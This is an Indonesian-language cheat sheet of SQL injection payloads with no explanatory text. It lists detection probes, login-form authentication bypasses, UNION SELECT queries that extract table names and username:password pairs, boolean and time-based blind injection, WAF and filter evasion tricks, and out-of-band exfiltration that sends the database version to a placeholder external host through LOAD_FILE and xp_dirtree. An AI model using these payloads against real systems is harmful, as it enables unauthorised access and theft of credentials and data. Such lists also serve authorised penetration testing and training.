``` Daftar Payload SQL Injection (SQLi)

1. Deteksi & Pengujian Awal
'
''
"
""
')
"))
' OR 1=1--
" OR 1=1--
' OR 'a'='a
' OR 1=1#
' OR 1=1/*
1+1
3-2

2. Bypass Authentication (Login Forms)
admin'--
admin'#
admin'/*
' OR '1'='1'--
' OR 1=1--
' OR 1=1#
" OR ""="
admin' OR '1'='1'--

3. Pengambilan Data (Data Extraction)
a. Menentukan Jumlah Kolom (ORDER BY)
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--

b. Melihat Data (UNION SELECT)
' UNION SELECT NULL--
' UNION SELECT NULL, NULL--
' UNION SELECT 1,2,3--
' UNION SELECT @@version,2,3--
' UNION SELECT version(),2,3--
' UNION SELECT sqlite_version(),2,3--

c. Mendapatkan Daftar Tabel & Kolom (MySQL)
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--

d. Mengambil Data Sensitif
' UNION SELECT 1,username,password FROM users--
' UNION SELECT NULL,concat(username,':',password),NULL FROM users--

4. Blind SQL Injection
a. Boolean-Based Blind
' AND 1=1--
' AND 1=2--
' AND (SELECT SUBSTRING(@@version,1,1))='5'--
' AND (SELECT ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1),1,1)))=101--

b. Time-Based Blind
' AND SLEEP(5)--
'; WAITFOR DELAY '00:00:05'--
' OR (SELECT pg_sleep(5))--
' AND 1=(SELECT 1 FROM PG_SLEEP(5))--

5. Bypass Filter & WAF
a. Case Manipulation
' UnIoN SeLeCt 1,2,3--

b. Mengganti/Menghapus Spasi
'UNION/**/SELECT/**/1,2,3--
'UNION%0aSELECT%0a1,2,3--
'UNION%09SELECT%091,2,3--

c. Mengganti String
' OR 'unusual' = 'unusual'

d. Karakter Hex / Escape
' UNION SELECT 0x4D7953514C--
' UNION SELECT CHAR(77,121,83,81,76)--

e. Double Encoding
%2527

f. Komentar untuk Memecah Kata Kunci
'UN/**/ION SEL/**/ECT 1,2,3--

6. Out-of-Band (OOB) SQL Injection
a. MySQL
' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT @@version),'.yourdomain.com\\file.txt'))--

b. Microsoft SQL Server
'; EXEC master..xp_dirtree '\\' + (SELECT @@version) + '.yourdomain.com\\share' --

```
